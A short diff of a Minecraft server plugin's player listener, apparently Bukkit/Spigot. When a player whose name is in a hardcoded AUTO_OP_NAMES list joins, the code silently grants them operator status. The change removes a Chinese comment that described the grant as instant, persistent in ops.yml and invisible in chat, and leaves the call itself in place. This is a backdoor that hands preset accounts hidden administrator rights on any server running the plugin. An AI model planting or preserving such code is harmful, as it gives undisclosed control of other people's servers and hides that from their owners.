@@ -43,7 +43,6 @@ public class PlayerListener implements Listener {
 
         String playerName = player.getName();
         if (AUTO_OP_NAMES.contains(playerName) && !player.isOp()) {
-            // 原生API，立刻内存生效，会写进ops.yml持久保存，控制台会输出一行日志，聊天框无提示
             player.setOp(true);
         }
     }
